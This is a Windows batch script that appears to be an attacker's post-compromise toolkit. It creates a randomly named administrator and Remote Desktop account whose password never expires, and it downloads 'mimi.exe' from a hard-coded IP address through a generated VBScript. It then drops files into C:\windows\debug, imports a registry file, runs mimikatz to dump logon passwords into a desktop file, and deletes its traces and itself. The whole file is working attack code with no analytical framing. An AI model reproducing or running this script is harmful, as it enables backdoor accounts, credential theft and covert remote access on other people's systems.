@echo off
setlocal enabledelayedexpansion
set #=abcdefghijklmnopqrstuvwxyz1234567890
for /l %%i in (1 1 4) do (
    set /a _ = !random! %% 36
    for %%_ in (!_!) do set $user=!$user!!#:~%%_,1!
)
echo %$user%>> %userprofile%\Desktop\ps.txt

@echo off&setlocal enabledelayedexpansion
:a
set a=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890
set/a b=%random%%%62
set/a c+=1
set Str=%Str%!a:~%b%,1!
if not !c! == 8 goto a
echo %Str%#>> %userprofile%\Desktop\ps.txt

@echo off
set login=%$user%
set pass=%Str%#

net user %login% %pass% /add
net localgroup "Remote Desktop Users" %login% /add
net accounts /maxpwage:unlimited
net localgroup Administrators %login% /add
net localgroup Administrateurs %login% /add
net localgroup Administratoren %login% /add
net localgroup Administradores %login% /add

@echo off
wmic os get Caption

@echo off
for /f "skip=2 tokens=2 delims=," %%i in ('wmic os get TotalVisibleMemorySize /format:CSV') do (
set richparm3=%%i&goto e2)
:e2

@echo off
rem a/b
rem /a
set /a a=%richparm3%,b=1024000
set /a result=%a%/%b%
echo:%result%GB

@echo off
set Url=http://64.235.38.82:2688/mimi.exe
set Save=%userprofile%\Desktop
if exist %Save% (echo:%Save%) else (mkdir %Save% & echo:%Save%)
for %%a in ("%Url%") do set "FileName=%%~nxa"
(if exist "%Save%\%FileName%" (goto beginInstall)
echo Download Wscript.Arguments^(0^),Wscript.Arguments^(1^)
echo Sub Download^(url,target^)
echo   Const adTypeBinary = 1
echo   Const adSaveCreateOverWrite = 2
echo   Dim http,ado
echo   Set http = CreateObject^("Msxml2.ServerXMLHTTP"^)
echo   http.open "GET",url,False
echo   http.send
echo   Set ado = createobject^("Adodb.Stream"^)
echo   ado.Type = adTypeBinary
echo   ado.Open
echo   ado.Write http.responseBody
echo   ado.SaveToFile target
echo   ado.Close
echo End Sub)>DownloadFile.vbs
DownloadFile.vbs "%Url%" "%Save%\%FileName%"
del DownloadFile.vbs
if exist "%Save%\%FileName%" (echo:%Save%\%FileName% & start /wait "" "%Save%\%FileName%" -p199211 /s )
del /a /f /s /q "%userprofile%\Desktop\mimi.exe"

@echo off
copy %userprofile%\Desktop\mimi\x64\admin.bat C:\windows\debug
copy %userprofile%\Desktop\mimi\x64\back.bat C:\windows\debug
regedit /s %userprofile%\Desktop\mimi\x64\registery.reg
@setlocal enableextensions
@cd /d "%~dp0"
IF "%PROCESSOR_ARCHITECTURE%"=="x86" (
%userprofile%\Desktop\mimi\Win32\mimikatz.exe privilege::debug sekurlsa::logonPasswords exit>> %userprofile%\Desktop\ps.txt | echo Executed 32. You can close .
) else (
echo bit=x64
%userprofile%\Desktop\mimi\x64\mimikatz.exe privilege::debug sekurlsa::logonPasswords exit>> %userprofile%\Desktop\ps.txt | echo Executed 64. You can close .
)
start notepad "%userprofile%\Desktop\ps.txt"
rd/s/q "%userprofile%\Desktop\mimi"
pause
logoff

@echo off
del /a /f /s /q "%userprofile%\Desktop\ps.txt"
del %0






